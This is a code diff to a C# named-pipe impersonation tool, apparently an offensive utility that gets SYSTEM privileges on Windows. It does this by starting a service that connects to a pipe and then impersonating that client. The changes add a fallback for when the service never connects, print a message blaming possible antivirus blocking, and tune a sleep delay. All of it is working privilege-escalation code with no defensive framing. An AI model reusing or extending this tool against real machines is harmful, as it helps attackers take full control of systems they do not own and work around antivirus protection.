@@ -5,6 +5,7 @@ using System.IO.Pipes;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.Text;
 using System.Threading;
 using NamedPipeImpersonation.Interop;
 
@@ -20,6 +21,7 @@ namespace NamedPipeImpersonation.Library
             do
             {
                 int error;
+                string pipeMessage;
                 string s4uUser = Environment.UserName;
                 string s4uDomain = Environment.UserDomainName;
                 var hPrimaryToken = IntPtr.Zero;
@@ -70,9 +72,14 @@ namespace NamedPipeImpersonation.Library
 
                         serviceThread.Start();
                         pipeServer.WaitForConnection();
-                        pipeReader.ReadToEnd();
+                        pipeMessage = pipeReader.ReadToEnd();
+                        Globals.isPipeConnected = true;
 
-                        if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
+                        if (Helpers.CompareIgnoreCase(pipeMessage, "timeout"))
+                        {
+                            Console.WriteLine("[-] Timeout. Maybe blocked by anti-virus.");
+                        }
+                        else if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
                         {
                             isImpersonated = (Environment.UserName.Length != 0);
 
@@ -197,6 +204,8 @@ namespace NamedPipeImpersonation.Library
 
             if (isImpersonated)
                 NativeMethods.RevertToSelf();
+            else
+                Console.WriteLine("[-] Failed to GetSystem.");
 
             Console.WriteLine("[*] Done.");
 
@@ -209,7 +218,7 @@ namespace NamedPipeImpersonation.Library
             Console.WriteLine("[>] Trying to create and start named pipe client service.");
             Console.WriteLine("    [*] Service Name : {0}", Globals.serviceName);
 
-            Thread.Sleep(500);
+            Thread.Sleep(100);
             Globals.hService = Utilities.StartNamedPipeClientService(Globals.serviceName);
 
             if (Globals.hService == IntPtr.Zero)
@@ -220,6 +229,22 @@ namespace NamedPipeImpersonation.Library
             else
             {
                 Console.WriteLine("[+] Named pipe client service is started successfully.");
+
+                Thread.Sleep(Globals.timeout);
+
+                if (!Globals.isPipeConnected)
+                {
+                    try
+                    {
+                        using (var pipeClient = new NamedPipeClientStream(".", Globals.serviceName, PipeDirection.Out))
+                        {
+                            var message = Encoding.ASCII.GetBytes("timeout");
+                            pipeClient.Connect();
+                            pipeClient.Write(message, 0, message.Length);
+                        }
+                    }
+                    catch { }
+                }
             }
         }
     }
